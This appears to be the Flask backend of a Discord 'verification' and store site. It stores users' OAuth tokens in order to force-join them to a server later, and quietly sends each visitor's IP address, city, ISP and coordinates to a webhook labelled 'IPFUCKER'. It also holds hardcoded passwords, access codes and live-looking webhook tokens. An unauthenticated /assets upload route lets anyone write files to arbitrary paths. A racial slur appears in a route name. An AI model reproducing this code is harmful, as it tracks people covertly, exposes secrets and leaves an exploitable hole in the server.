from flask import Flask, request, render_template, jsonify, send_from_directory, abort, redirect, flash, url_for, session, Response
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from flask_cors import CORS
import bcrypt
import sqlite3
import requests
import os
import time
import random
import string
from dotenv import load_dotenv
from mimetypes import guess_type
from datetime import timedelta, datetime
load_dotenv()

app = Flask(__name__)
CORS(app)
app.secret_key = os.getenv('DISCORD_CLIENT_SECRET')

# Configure Flask-Limiter
limiter = Limiter(
    get_remote_address,
    app=app,
    default_limits=["100 per second"],
)

# Discord API Credentials
CLIENT_ID = os.getenv('DISCORD_CLIENT_ID')
CLIENT_SECRET = os.getenv('DISCORD_CLIENT_SECRET')
REDIRECT_URI = os.getenv('DISCORD_REDIRECT_URI')
BOT_TOKEN = os.getenv('DISCORD_BOT_TOKEN')
TARGET_GUILD_ID = os.getenv('DISCORD_GUILD_ID')
DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL')
TICKETS_FOLDER = 'tickets'
os.makedirs(TICKETS_FOLDER, exist_ok=True)
app.config['TICKETS_FOLDER'] = TICKETS_FOLDER


# Session configuration
app.config["SESSION_PERMANENT"] = True
app.config["PERMANENT_SESSION_LIFETIME"] = timedelta(days=365 * 10) # 10 years
app.config["SESSION_TYPE"] = "filesystem"
app.config["SESSION_COOKIE_HTTPONLY"] = True
app.config["SESSION_COOKIE_SECURE"] = True

@app.before_request
def protect_source_files():
    prohibited_extensions = ['.py', '.env', '.config', '.db', '.txt']
    for ext in prohibited_extensions:
        if request.path.endswith(ext):
            return redirect("https://pornhub.com/", code=302)


        
@app.errorhandler(404)
def handle_404_error(e):
    return render_template('error.html', token_response="The server cannot find the requested resource!"), 404

@app.errorhandler(405)
def handle_405_error(e):
    return redirect('https://youtu.be/qe38rXJVcR8?si=35KzzDDd5xCdMdmk')

# Database file
DB_FILE = 'users.db'
DATABASE = 'orders.db'

# Define and hash the admin code
RAW_ADMIN_CODE = os.getenv('ADMIN_CODE')
ADMIN_HASHED_CODE = bcrypt.hashpw(RAW_ADMIN_CODE.encode(), bcrypt.gensalt())

# Initialize database
def init_db():
    """Initialize the SQLite database."""
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (user_id TEXT PRIMARY KEY, access_token TEXT)''')
    conn.commit()
    conn.close()
    
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS orders (
                    unique_id TEXT PRIMARY KEY,
                    status TEXT,
                    created_at TEXT,
                    completed_at TEXT,
                    gateway TEXT,
                    price TEXT,
                    currency TEXT,
                    email TEXT,
                    customer_discord_id TEXT,
                    customer_discord_username TEXT,
                    product TEXT,
                    quantity INTEGER,
                    total_price TEXT,
                    delivery_details TEXT
                )''')
    conn.commit()
    conn.close()

# Rate-limit error handler
@app.errorhandler(429)
def rate_limit_exceeded(e):
    """Handle requests exceeding the rate limit."""
    return render_template('error.html', token_response="Overloaded, try again later!"), 429

def get_client_ip():
    headers_to_check = ["CF-Connecting-IP", "X-Forwarded-For", "X-Real-IP"]
    for header in headers_to_check:
        if request.headers.get(header):
            return request.headers.get(header).split(",")[0].strip()
    return request.remote_addr

        
@app.before_request
def check_banned():
    if 'blocked' in session and session['blocked'] is True:
        return render_template('error.html', token_response="Access denied, all connections has been ceased. Under no circumstances you are permitted !"), 429
    # Otherwise do nothing
    
@app.before_request
def no_vpn():
    user_ip = get_client_ip()
    ip_info = get_ip_info(user_ip)
    
    if ip_info["proxy"]:
        return render_template('error.html', token_response='Proxy/VPN detected. Please disable it and try again.')



def check_vpn(user_ip):
    user_ip = get_client_ip()
    response = requests.get(f"http://ip-api.com/json/{user_ip}?fields=200704", timeout=30)
    response.raise_for_status()
    data = response.json()
    
    proxy = data.get("proxy", False)
    if proxy:
        return True
    

def get_ip_info(ip):
    """Fetch IP geolocation information."""
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=140253", timeout=10)
        response.raise_for_status()
        data = response.json()
        return {
            "query": data.get("query", "Unknown"),
            "country": data.get("country", "N/A"),
            "region": data.get("regionName", "N/A"),
            "city": data.get("city", "N/A"),
            "isp": data.get("isp", "N/A"),
            "timezone": data.get("timezone", "N/A"),
            "lat": data.get("lat", 0.0),
            "lon": data.get("lon", 0.0),
            "proxy": data.get("proxy", False)
        }
    except requests.exceptions.RequestException:
        return {"query": ip, "country": "Unknown", "region": "Unknown", "city": "Unknown", 
                "isp": "Unknown", "timezone": "Unknown", "lat": 0.0, "lon": 0.0, "proxy": False}



# Replace with your actual domain
ALLOWED_DOMAIN = {"http://127.0.0.1:3000", "http://localhost:3000", "https://dps-verify.site", "https://chickenugget.xyz", "https://dpsstore.store"}

# Define the absolute path to the protected JS directory
PROTECTED_JS_DIR = os.path.abspath('dps-store-on-top')

@app.route('/im-a-nigga/<path:filename>')
def im_a_nigga(filename):
    ip_address = get_client_ip()
    
    # Prevent path traversal by resolving the absolute file path
    requested_path = os.path.abspath(os.path.join(PROTECTED_JS_DIR, filename))
    if not requested_path.startswith(PROTECTED_JS_DIR):
        rate_limit_data[ip_address][1] = time.time() + LOCKOUT_DURATION * 315360000
        session['blocked'] = True
        return render_template('error.html', token_response="Access Denied !"), 403
        #abort(403)   Forbidden

    # Check the Referer header
    referer = request.headers.get('Referer', '')
    if not any(referer.startswith(domain) for domain in ALLOWED_DOMAIN):
        rate_limit_data[ip_address][1] = time.time() + LOCKOUT_DURATION * 315360000
        session['blocked'] = True
        return render_template('error.html', token_response="Access Denied !"), 403

    # Serve the protected JavaScript file if the referer is valid
    return send_from_directory(PROTECTED_JS_DIR, filename, mimetype='application/javascript')


@app.route('/')
def index():
    """Root endpoint with a link to authorize."""
    auth_url = (    
        f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}"
        f"&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify%20guilds.join"
    )
    
    return render_template('index.html', auth_url=auth_url)



@app.route('/callback')
def callback():
    code = request.args.get('code')
    if not code:
        return render_template('error.html', token_response='Authorization failed.')

    # Exchange authorization code for access token
    data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI,
    }
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    try:
        response = requests.post("https://discord.com/api/oauth2/token", data=data, headers=headers, timeout=10)
        response.raise_for_status()
        token_response = response.json()
    except requests.exceptions.RequestException as e:
        print(f"Token exchange error: {e}")
        return render_template('error.html', token_response='Failed to exchange code.')

    access_token = token_response.get('access_token')
    if not access_token:
        return render_template('error.html', token_response='Authorization failed.')

    # Get user information 
    user_info = get_user_info(access_token)
    if not user_info:
        return render_template('error.html', token_response='Failed to fetch user info.')

    # Extract user data
    user_id = user_info['id']
    save_user(user_id, access_token)
    user_id = user_info.get('id')
    username = user_info.get('username')
    avatar_hash = user_info.get('avatar')
    if avatar_hash:
        # User has a custom avatar
        global avatar_url
        avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.png"
    else:
        # User has a default avatar
        discriminator = int(user_info.get('discriminator', '0'))  # Default to '0' if missing
        default_avatar_id = discriminator % 5
        avatar_url = f"https://cdn.discordapp.com/embed/avatars/{default_avatar_id}.png"
        

    # Ensure required data exists
    if not all([user_id, username]):
        return render_template('error.html', token_response='Missing required user data.')

    # Send to webhook
    try:
        webhook_status = send_to_webhook(user_id, username, avatar_hash)
        if webhook_status:
            # If successful        
            return render_template('success.html')

        # If cant
        return render_template('error.html', token_response='Failed to send webhook data.')
    except requests.exceptions.RequestException as e:
        print(f"Webhook error: {e}")
        return render_template('error.html', token_response='Failed to send webhook data.')
    


# In-memory storage for rate-limiting (use Redis or a database in production)
rate_limit_data = {}
MAX_ATTEMPTS = 3
LOCKOUT_DURATION = 86400


# Session configuration: auto logout after 24 hours
app.config["SESSION_PERMANENT"] = True
app.config["PERMANENT_SESSION_LIFETIME"] = timedelta(hours=24)
app.config["SESSION_TYPE"] = "filesystem"


def is_rate_limited(ip_address):
    """Check if the IP address is rate-limited."""
    if ip_address in rate_limit_data:
        attempts, lockout_time = rate_limit_data[ip_address]
        if time.time() < lockout_time:
            return True, lockout_time - time.time()
    return False, None

# Define allowed credentials as a mapping of user ID to its corresponding password (both as provided)
ALLOWED_CREDENTIALS = {
    4060942590149190: b"xrKh8QYw9Ucb3eICKuMs101TEVUrjYtOiyqz435dml92qjmnuQCEmirXTW4DMbzCnfILrnqEbpPIyY4ZhDtHqmJ6AmO048DRGll4",
    18930074034729898: b"ApgmdJ35xfBdlAkhdnHeVj1ztHbor57MOyDQGfNL45q9GikPoEytsSoBJx5PQBmmPGd72Vv3vWumN9QYB9757UXQWqrAz7ZSmmWi"
}

# Precompute hashed credentials (only the password is hashed, and it's stored per user_id)
hashed_credentials = {}
for user_id, password in ALLOWED_CREDENTIALS.items():
    salt = bcrypt.gensalt()
    hashed_credentials[user_id] = bcrypt.hashpw(password, salt)


LOGIN_CODE = "jejDRC9ffTXLqeAply00ebA1opzw2h3rCRi3g71eF7aixzMuSlwfxlfarG3j9bqWKH4LJYUF7cnz0fYA0iauTqEZDkrwRfY0J6LK"
LOGIN_CODE = bcrypt.hashpw(LOGIN_CODE.encode(), bcrypt.gensalt())
PREVENT_WEBHOOK = "https://discord.com/api/webhooks/1350867729904701510/kuNXqZMyKpeTAZPV2XLR-rTzRuUJpI2Jc-cD24VRp4mfCri3DUGBT33zGLmGEHy-K2GO"


@app.route('/login', methods=['GET', 'POST'])
def login():
    ALLOWED_DOMAIN = {"dpsstore.store", "127.0.0.1:3000", "localhost:3000"}
    # Updated allowed-domain check:
    if request.host not in ALLOWED_DOMAIN:
        default_domain = sorted(ALLOWED_DOMAIN)[0]
        return redirect(f"//{default_domain}{request.full_path}")
    
    ip_address = get_client_ip()
    
    vpn = check_vpn(ip_address)
    if vpn:
        return render_template('error.html', token_response='Proxy/VPN detected. Please disable it and try again.')
    
    
    
    limited, remaining_time = is_rate_limited(ip_address)
    if limited:
        years = int(remaining_time // 31536000)
        months = int((remaining_time % 31536000) // 2592000)
        return render_template('error.html', token_response=f"You are rate-limited. Try again in {years} years and {months} months."), 429
    
    if request.method == 'GET':
        return render_template('login.html')
    
    
    code = request.headers.get("LOGIN-Code")
    if not code:
        rate_limit_data.setdefault(ip_address, [0, 0])
        rate_limit_data[ip_address][1] = time.time() + 315360000
        session['blocked'] = True
        return render_template('error.html', token_response="Unauthorized"), 403

    if not bcrypt.checkpw(code.encode(), LOGIN_CODE):
        rate_limit_data[ip_address][1] = time.time() + 315360000
        session['blocked'] = True
        return render_template('error.html', token_response="Unauthorized"), 403

    # Expect JSON data from the client
    data = request.get_json()
    if not data or 'user_id' not in data or 'password' not in data:
        return jsonify({'message': 'A field is missing.'}), 400
    
    password = data['password']
    user_id = data['user_id']

    # Validate user_id as an integer
    try:
        user_id_val = int(user_id)
    except ValueError:
        user_id_val = 696969

    # Check if the user_id exists in our allowed credentials
    if user_id_val not in ALLOWED_CREDENTIALS:
        rate_limit_data.setdefault(ip_address, [0, 0])
        rate_limit_data[ip_address][0] += 1
        if rate_limit_data[ip_address][0] >= MAX_ATTEMPTS:
            rate_limit_data[ip_address][1] = time.time() + 315360000
            
            session.permanent = True
            session['blocked'] = True
            session['ip_address'] = ip_address
            return render_template('error.html', token_response="You are rate-limited. Try again later!"), 403
        remaining_attempts = MAX_ATTEMPTS - rate_limit_data[ip_address][0]
        return jsonify({'message': f'Invalid user ID. {remaining_attempts} attempt(s) left.'}), 401

    # Verify the submitted password against the stored hash for this specific user_id
    stored_hash = hashed_credentials[user_id_val]
    if not bcrypt.checkpw(password.encode(), stored_hash):
        rate_limit_data.setdefault(ip_address, [0, 0])
        rate_limit_data[ip_address][0] += 1
        if rate_limit_data[ip_address][0] >= MAX_ATTEMPTS:
            rate_limit_data[ip_address][1] = time.time() + 315360000
            
            session.permanent = True
            session['blocked'] = True
            session['ip_address'] = ip_address
            
            return render_template('error.html', token_response="You are rate-limited. Try again later!"), 403
        remaining_attempts = MAX_ATTEMPTS - rate_limit_data[ip_address][0]
        return jsonify({'message': f'Invalid password. {remaining_attempts} attempt(s) left.'}), 401

    # Successful login: clear rate limit data for this IP
    if ip_address in rate_limit_data:
        del rate_limit_data[ip_address]

    
    session.permanent = True
    session['logged_in'] = True
    session['user_id'] = user_id_val
    

    message = {
        "content": "@everyone",
        "embeds": [
            {
                "title": "⚠️ Security Alert",
                "description": f"**A NEW IP ADDRESS IS TRYING TO ACCESS ADMIN/LOGIN ROUTE AND HAS ATTEMPTED SUCCESSFULLY!**\nIP Address: **{ip_address}**",
                "color": 16711680  # Red color
            }
        ]
    }

    headers = {"Content-Type": "application/json"}
    response = requests.post(PREVENT_WEBHOOK, json=message, headers=headers, timeout=10)
    response.raise_for_status()
    
    # Instead of sending an HTTP redirect, return JSON with the redirect URL.
    return jsonify({
        "message": "Login successful.",
        "redirect_url": url_for("admin")
    })


@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    session.pop('user_id', None)
    return redirect(url_for('login'))
    

@app.route('/pull_members', methods=['GET', 'POST'])
def pull_members():
    """Pull authorized users into the Discord server."""
    ALLOWED_DOMAIN = {"dpsstore.store", "127.0.0.1:3000", "localhost:3000"}
    if request.host not in ALLOWED_DOMAIN:
        default_domain = sorted(ALLOWED_DOMAIN)[0]
        return redirect(f"//{default_domain}{request.full_path}")    

    ip_address = get_client_ip()
    
    vpn = check_vpn(ip_address)
    if vpn:
        return render_template('error.html', token_response='Proxy/VPN detected. Please disable it and try again.')

    # Check rate limiting
    rate_limited, remaining_time = is_rate_limited(ip_address)
    if rate_limited:
        return render_template('error.html', token_response=f"You are rate-limited. Try again in {int(remaining_time//3600)} hours and  {int((remaining_time% 3600) // 60)} minutes."),429

    if request.method == 'GET':
        # Render the admin code form
        return render_template('pull_members.html')
    
    if 'blocked' in session and session['blocked'] is True:
        return render_template('error.html', token_response="You are prohibited from accessing the server!"),429
    else:
        pass

    # POST method: Process the form submission
    data = request.get_json()  # Accept JSON data from the front-end
    if not data or 'admin_code' not in data:
        return jsonify({'message': 'Missing required data.', 'rate_limited': False}), 400

    admin_code = data['admin_code']
    if not bcrypt.checkpw(admin_code.encode(), ADMIN_HASHED_CODE):
        # Handle failed login attempts
        if ip_address not in rate_limit_data:
            rate_limit_data[ip_address] = [0, 0]  # [attempts, lockout_time]

        rate_limit_data[ip_address][0] += 1  # Increment attempt count
        if rate_limit_data[ip_address][0] >= MAX_ATTEMPTS:
            rate_limit_data[ip_address][1] = time.time() + LOCKOUT_DURATION  # Set lockout time
            
            session.permanent = True
            session['blocked'] = True
            session['ip_address'] = ip_address
            
            return render_template('error.html', token_response="You are rate-limited. Try again later!"),403

        remaining_attempts = MAX_ATTEMPTS - rate_limit_data[ip_address][0]
        return jsonify({
            'message': f'Invalid admin code. You have {remaining_attempts} attempts left.',
            'rate_limited': False
        }), 401

    # Reset attempts on successful login
    if ip_address in rate_limit_data:
        del rate_limit_data[ip_address]

    # Pull all authorized users into the target Discord server
    users = get_all_users()
    if not users:
        return render_template('error.html', token_response="No authorized users found in the database."), 404

    results = []
    for user_id, access_token in users:
        success = add_user_to_guild(user_id, access_token)
        if success:
            results.append(f"User {user_id} added successfully.")
        else:
            results.append(f"Failed to add user {user_id}.")

    return jsonify({
        'message': 'Members pulled successfully.',
        'results': results,
        'rate_limited': False
    })


#Ticket link :(
def generate_random_string(length=64):
    """Generate a random alphanumeric string."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))





AUTH_CODE = 'xA2oklpHu15iwrihifAfre5ogec3lswiwRu7odrEdE7ax8crazoflb5pRaf0t6i8-TR&1lz6dr*jo3=swi_6d-zuKitls0o-rlcrIchl3r'
AUTH_CODE = bcrypt.hashpw(AUTH_CODE.encode(), bcrypt.gensalt())

@app.route('/upload', methods=['POST'])
def upload_file():
    
    ip_address = get_client_ip()
    rate_limited, remaining_time = is_rate_limited(ip_address)
    if rate_limited:
        return render_template('error.html', token_response=f"You are rate-limited. Try again in {int(remaining_time//3600)} hours and  {int((remaining_time% 3600) // 60)} minutes."),429

    code = request.headers.get("Auth-Code")
    if not code:
        rate_limit_data.setdefault(ip_address, [0, 0])
        rate_limit_data[ip_address][1] = time.time() + LOCKOUT_DURATION * 315360000
        session['blocked'] = True
        return jsonify({"error": "Unauthorized. You have been banned"}), 403

    if not bcrypt.checkpw(code.encode(), AUTH_CODE):
        rate_limit_data[ip_address][1] = time.time() + LOCKOUT_DURATION * 315360000
        session['blocked'] = True
        return jsonify({"error": "Unauthorized. You have been banned."}), 403
    
    if 'file' not in request.files:
        return render_template('error.html', token_response="No file part"), 400

    file = request.files['file']
    if file.filename == '':
        return render_template('error.html', token_response="No selected file"), 400

    # Generate a random key and use it as the filename
    random_key = generate_random_string()
    _, extension = os.path.splitext(file.filename)
    random_filename = f"{random_key}{extension}"

    # Save the file directly using the random filename
    file_path = os.path.join(app.config['TICKETS_FOLDER'], random_filename)
    file.save(file_path)

    # Generate the view link
    file_url = f"https://dpsstore.store/view/?target={random_key}"
    return jsonify({'message': 'File uploaded successfully!', 'view_link': file_url}), 200


@app.route('/view/', methods=['GET'])
def view_file():
    # Enforce the specific domain
    allowed_domains = {'127.0.0.1:3000', 'localhost', '127.0.0.1', 'chickenugget.xyz', 'dpsstore.store'}

    # Extract the host without the port number
    host = request.host.split(':')[0]  

    if host not in allowed_domains:
        return render_template('error.html', token_response="Oops, the file/page you are trying to access is not found!"), 404


    random_key = request.args.get('target')
    if not random_key or len(random_key) != 64:
        return render_template('error.html', token_response="Error, target key is invalid"), 404

    # Locate the file
    file_path = None
    for filename in os.listdir(app.config['TICKETS_FOLDER']):
        if filename.startswith(random_key):
            file_path = os.path.join(app.config['TICKETS_FOLDER'], filename)
            break

    if not file_path or not os.path.exists(file_path):
        return render_template('error.html', token_response="Unknown specified location."), 404

    filename = os.path.basename(file_path)
    return send_from_directory(app.config['TICKETS_FOLDER'], filename)


# Make sure this folder exists and Flask has write permission.
UPLOAD_FOLDER = os.path.abspath('./usr/share/assets')
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route('/assets/<path:filename>', methods=['POST'])
def upload_asset_file(filename):
    filename = filename.lstrip('/')
    file_path = os.path.join(UPLOAD_FOLDER, filename)
    os.makedirs(os.path.dirname(file_path), exist_ok=True)
    
    # Process the file upload
    file = request.files.get('file')
    if not file:
        return jsonify({"message": "No file received!"}), 400

    try:
        file.save(file_path)
        print(f"Saved file {file_path} ({os.path.getsize(file_path)} bytes)")
        return '', 201
    except Exception as e:
        app.logger.error("Upload error: " + str(e))
        abort(500)



@app.route('/assets/<path:filename>', methods=['GET'])
def serve_asset_file(filename):
    filename = filename.lstrip('/')
    mime_type, _ = guess_type(filename)  # Guess the MIME type
    return send_from_directory(UPLOAD_FOLDER, filename, mimetype=mime_type, as_attachment=False)






@app.route('/sellix-webhook', methods=['POST'])
def sellix_webhook():
    data = request.json
    if not data:
        return jsonify({"error": "Invalid data"}), 400
    
    unique_id = data.get("unique_id")
    if not unique_id:
        return jsonify({"error": "Missing unique_id"}), 400
    
    # Extract the relevant fields.
    status = data.get("status")
    created_at = data.get("created_at")
    completed_at = data.get("completed_at")
    gateway = data.get("gateway")
    price = data.get("price")
    currency = data.get("currency")
    email = data.get("email")
    
    customer = data.get("customer", {})
    customer_discord_id = customer.get("discord_id", "")
    customer_discord_username = customer.get("discord_username", "")
    
    item = data.get("item", {})
    product = item.get("product", {}).get("name", "Unknown Product")
    quantity = item.get("quantity", 1)
    total_price = item.get("total_price", price)
    
    # Insert or update the order in the SQLite database.
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("SELECT * FROM orders WHERE unique_id = ?", (unique_id,))
    existing = c.fetchone()
    if existing is None:
        c.execute('''INSERT INTO orders (unique_id, status, created_at, completed_at, gateway, price, currency, email,
                    customer_discord_id, customer_discord_username, product, quantity, total_price, delivery_details)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                    (unique_id, status, created_at, completed_at, gateway, price, currency, email,
                     customer_discord_id, customer_discord_username, product, quantity, total_price, None))
    else:
        c.execute('''UPDATE orders 
                     SET status=?, created_at=?, completed_at=?, gateway=?, price=?, currency=?, email=?,
                         customer_discord_id=?, customer_discord_username=?, product=?, quantity=?, total_price=?
                     WHERE unique_id=?''',
                    (status, created_at, completed_at, gateway, price, currency, email,
                     customer_discord_id, customer_discord_username, product, quantity, total_price, unique_id))
    conn.commit()
    conn.close()
    
    # Create a tracking link for this order.
    tracking_link = f"https://dpsstore.store/process/{unique_id}"
    
    message = {
        "content": "",  # Optional: Mention roles or users here
        "embeds": [{
            "title": "🎉 <@&1300855306250752031> New Order Received!",
            "fields": [
                {"name": "📜 INVOICE", "value": f"{unique_id}"},
                {"name": "📦 PRODUCT", "value": f"**{product}**"},
                {"name": "💵 TOTAL PRICE", "value": f"**{total_price} {currency}**"},
                {"name": "CUSTOMER EMAIL", "value": f"{email}"},
                {"name": "🔗 VIEW ORDER", "value": f"[Click Here]({tracking_link})"}
            ],
            "color": 16711680,
            "footer": {"text": "GO CHECK THE ORDER DAMN IT"},
            "timestamp": datetime.utcnow().isoformat()
        }]
    }

    
    response = requests.post(DISCORD_WEBHOOK_URL, json=message)
    if response.status_code not in [200, 204]:
        return jsonify({"error": "Failed to process purchase, create a support ticket in server immediately !"}), 500
    
    return jsonify({"success": True, "tracking_link": tracking_link}), 200

@app.route('/track/<unique_id>', methods=['GET'])
def track_order(unique_id):
    
    ALLOWED_DOMAIN = {"dpsstore.store", "127.0.0.1:3000", "localhost:3000"}
    if request.host not in ALLOWED_DOMAIN:
        default_domain = sorted(ALLOWED_DOMAIN)[0]
        return redirect(f"//{default_domain}{request.full_path}")
    
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("SELECT * FROM orders WHERE unique_id = ?", (unique_id,))
    order = c.fetchone()
    conn.close()
    
    if order is None:
        return render_template('error.html', token_response="Order not found!"), 404
        #return "Order not found", 404
    
    # Convert the order tuple to a dictionary
    order_dict = dict(order)

    order_dict = dict(order)
    return render_template('order.html', order=order_dict)

###############################
# Admin Panel - Order List
###############################


@app.route('/admin')
def admin():
    
    ALLOWED_DOMAIN = {"dpsstore.store", "127.0.0.1:3000", "localhost:3000"}
    if request.host not in ALLOWED_DOMAIN:
        default_domain = sorted(ALLOWED_DOMAIN)[0]
        return redirect(f"//{default_domain}{request.full_path}")
    
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    return render_template('admin.html')


API_CODE = "KiIhrYd0G435pnHY28jo8iMsG7OQ6XaIa34V7n7XNrFHrLQv6hGrYcXU4Is0kh4Qu7Etf0k9SZDomuTpX3YN9CbSXXSOcErXQRAL"
API_CODE = bcrypt.hashpw(API_CODE.encode(), bcrypt.gensalt())

@app.route('/api/orders', methods=['GET'])
def api_orders():
    
    ip_address = get_client_ip()
    rate_limited, remaining_time = is_rate_limited(ip_address)
    if rate_limited:
        return render_template('error.html', token_response=f"You are rate-limited. Try again in {int(remaining_time//3600)} hours and  {int((remaining_time% 3600) // 60)} minutes."),429

    code = request.headers.get("API-Code")
    if not code:
        rate_limit_data.setdefault(ip_address, [0, 0])
        rate_limit_data[ip_address][1] = time.time() + LOCKOUT_DURATION * 2
        return jsonify({"error": "Unauthorized. You have been blocked for 48 hours."}), 403

    if not bcrypt.checkpw(code.encode(), API_CODE):
        rate_limit_data[ip_address][1] = time.time() + LOCKOUT_DURATION * 2
        return jsonify({"error": "Unauthorized. You have been blocked for 48 hours."}), 403    

    page = request.args.get('page', 1, type=int)
    search = request.args.get('search', '', type=str)
    status = request.args.get('status', 'all', type=str)

    conn = get_db_connection()
    c = conn.cursor()

    query = "SELECT * FROM orders"
    params = []
    filters = []

    # Search by unique_id if provided
    if search:
        filters.append("unique_id LIKE ?")
        params.append(f"%{search}%")

    # Filtering by status:
    # Delivered Only:
    if status.lower() == 'delivered':
        filters.append("status = 'Delivered'")
    # Completed Only: (i.e. orders that are completed but not delivered)
    elif status.lower() == 'completed':
        filters.append("completed_at IS NOT NULL AND completed_at <> '' AND status <> 'Delivered'")

    if filters:
        query += " WHERE " + " AND ".join(filters)

    # Sort by completed_at descending (newest first)
    query += " ORDER BY completed_at DESC"

    # Pagination: load 21 records to determine if there's more than 20
    offset = (page - 1) * 20
    query += " LIMIT 21 OFFSET ?"
    params.append(offset)

    c.execute(query, params)
    rows = c.fetchall()
    orders = [dict(row) for row in rows]

    has_more = False
    if len(orders) > 20:
        has_more = True
        orders = orders[:20]

    conn.close()
    return jsonify({"orders": orders, "has_more": has_more})



###############################
# Admin Processing Page
###############################
@app.route('/process/<unique_id>', methods=['GET', 'POST'])
def process_order(unique_id):
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    ALLOWED_DOMAIN = {"dpsstore.store", "127.0.0.1:3000", "localhost:3000"}
    if request.host not in ALLOWED_DOMAIN:
        default_domain = sorted(ALLOWED_DOMAIN)[0]
        return redirect(f"//{default_domain}{request.full_path}")
    
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("SELECT * FROM orders WHERE unique_id = ?", (unique_id,))
    order = c.fetchone()
    if not order:
        conn.close()
        return render_template('error.html', token_response="Order not found!"), 404
        #return "Order not found", 404

    if request.method == "POST":
        delivery_details = request.form.get("delivery_details")
        c.execute("UPDATE orders SET delivery_details = ? WHERE unique_id = ?", (delivery_details, unique_id))
        c.execute("UPDATE orders SET status = 'Delivered' WHERE unique_id = ?", (unique_id,))
        conn.commit()
        conn.close()
        flash("Delivery details updated successfully!", "success")
        return jsonify(success=True, newDetails=delivery_details)
    
    conn.close()
    return render_template('process.html', order=dict(order))




# Helper Functions
def get_user_info(access_token):
    """Fetch user information from Discord."""
    headers = {'Authorization': f'Bearer {access_token}'}
    response = requests.get("https://discord.com/api/v10/users/@me", headers=headers)
    if response.status_code == 200:
        return response.json()
    return None

def send_to_webhook(user_id, username, avatar_hash):
    WEBHOOK_URL = os.getenv('WEBHOOK_URL')
    #WEBHOOK_URL = 'https://discord.com/api/webhooks/1322485204496945233/0tIlqbzE0bRj21mb86Qt3ydEOuvHc6WlxbP8gZ-n0uSGdBdYIJiTvfKQ3B9YSnznds7z'
    if not WEBHOOK_URL:
        print("Webhook URL not configured")
        return False

    user_ip = get_client_ip()
    ip_info = get_ip_info(user_ip)
    #avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.png?size=256"
    webhook_data = {
        "embeds": [
            {
                "title": "User Info",
                "color": 0xFFFF00,  # Yellow
                "thumbnail": {
                    "url": avatar_url
                },
                "fields": [
                    {"name": "Username", "value": username, "inline": True},
                    {"name": "User ID", "value": user_id, "inline": True},
                    {"name": "IP Address", "value": ip_info["query"], "inline": True},
                    {"name": "Country", "value": ip_info["country"], "inline": True},
                    {"name": "Region", "value": ip_info['region'], "inline": True},
                    {"name": "City", "value": ip_info["city"], "inline": True},
                    {"name": "ISP", "value": ip_info["isp"], "inline": True},
                    {"name": "Timezone", "value": ip_info["timezone"], "inline": True},
                    {"name": "Latitude", "value": str(ip_info["lat"]), "inline": True},
                    {"name": "Longitude", "value": str(ip_info["lon"]), "inline": True},
                    {"name": "Proxy", "value": bool(ip_info["proxy"]), "inline": True}
                ],
                "footer": {
                    "text": "IPFUCKER blocked A KID"
                }
            }
        ]
    }

    try:
        headers = {'Content-Type': 'application/json'}
        response = requests.post(WEBHOOK_URL, json=webhook_data, headers=headers, timeout=10)
        response.raise_for_status()
        return response.status_code == 204
    except requests.exceptions.RequestException as e:
        print(f"Error sending webhook: {e}")
        return False

def save_user(user_id, access_token):
    """Save user information to the database."""
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("REPLACE INTO users (user_id, access_token) VALUES (?, ?)", (user_id, access_token))
    conn.commit()
    conn.close()

def get_all_users():
    """Retrieve all users from the database."""
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id, access_token FROM users")
    users = c.fetchall()
    conn.close()
    return users

def add_user_to_guild(user_id, access_token):
    """Add a user to the target Discord server."""
    url = f"https://discord.com/api/v10/guilds/{TARGET_GUILD_ID}/members/{user_id}"
    headers = {'Authorization': f'Bot {BOT_TOKEN}', 'Content-Type': 'application/json'}
    data = {'access_token': access_token}
    response = requests.put(url, headers=headers, json=data)
    return response.status_code == 201

def get_db_connection():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn

# Initialize the database
init_db()

if __name__ == '__main__':
    app.run(host="0.0.0.0")
